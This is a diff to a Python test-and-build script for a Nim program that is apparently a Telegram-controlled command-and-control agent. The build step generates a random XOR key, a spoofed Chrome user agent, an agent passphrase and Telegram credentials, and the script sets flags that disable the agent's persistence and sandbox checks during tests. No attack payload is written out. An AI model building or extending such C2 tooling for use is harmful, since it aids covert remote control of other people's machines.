@@ -10,6 +10,7 @@ Run:  python tests/test_tg_commands.py [--build]
 """
 
 import argparse
+import os
 import pathlib
 import re
 import subprocess
@@ -17,14 +18,14 @@ import sys
 import time
 
 ROOT = pathlib.Path(__file__).resolve().parent.parent
-NIM = r"D:\appdata\nim-2.2.10\bin\nim.exe"
+NIM = os.environ.get("NIM") or "nim"
 REPL_EXE = ROOT / "build" / "sentinel_repl.exe"
 ENV = {
     "TELEGRAM_BOT_TOKEN": "123456:AAADUMMY",
     "TELEGRAM_CHAT_ID": "0",
     "C2_NO_PERSIST": "1",
     "C2_NO_SANDBOX_CHECK": "1",
-    "TEMP": __import__("os").environ.get("TEMP", r"C:\Windows\Temp"),
+    "TEMP": os.environ.get("TEMP", r"C:\Windows\Temp"),
 }
 
 passed = failed = 0
@@ -32,18 +33,46 @@ passed = failed = 0
 
 def build():
     import secrets as pysecrets
+
+    def nim_string(value):
+        return '"' + value.replace("\\", "\\\\").replace('"', '\\"') + '"'
+
     key = pysecrets.token_hex(32)
     key_nim = ("const XorKey: array[32, byte] = [byte "
                + ", ".join("0x" + key[i:i+2] for i in range(0, 64, 2)) + "]")
-    (ROOT / "xorkey.nim").write_text(key_nim + "\n")
+    prefix = "".join(pysecrets.choice(
+        "ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789")
+        for _ in range(3))
+    passphrase = (os.environ.get("C2_AGENT_PASSPHRASE") or
+                  os.environ.get("SENTINEL_SECRET") or
+                  pysecrets.token_hex(32))
+    user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                  "AppleWebKit/537.36 (KHTML, like Gecko) "
+                  "Chrome/124.0.0.0 Safari/537.36")
+    generated = {
+        "xorkey.nim": key_nim + "\n",
+        "prefix.nim": (f"const BuildPrefix* = {nim_string(prefix)}\n"
+                       f"const UserAgent* = {nim_string(user_agent)}\n"),
+        "secret.nim": f"const SECRET_PLAINTEXT* = {nim_string(passphrase)}\n",
+        "telegram_creds.nim": (
+            "const\n"
+            f"  TelegramBotToken* = {nim_string(ENV['TELEGRAM_BOT_TOKEN'])}\n"
+            f"  TelegramChatId* = {nim_string(ENV['TELEGRAM_CHAT_ID'])}\n"
+        ),
+    }
     cmd = [
         NIM, "c", "-d:release", "-d:sentinel_repl", "-d:c2_tg",
         "--app:console", "--path:common", "--threads:on",
         "--out:" + str(REPL_EXE), str(ROOT / "sentinel.nim"),
     ]
     print("[*] building REPL:", " ".join(cmd[1:6]), "…")
-    r = subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True)
-    (ROOT / "xorkey.nim").unlink(missing_ok=True)
+    try:
+        for name, content in generated.items():
+            (ROOT / name).write_text(content, encoding="utf-8")
+        r = subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True)
+    finally:
+        for name in generated:
+            (ROOT / name).unlink(missing_ok=True)
     if r.returncode != 0:
         print(r.stdout[-4000:])
         print(r.stderr[-2000:])
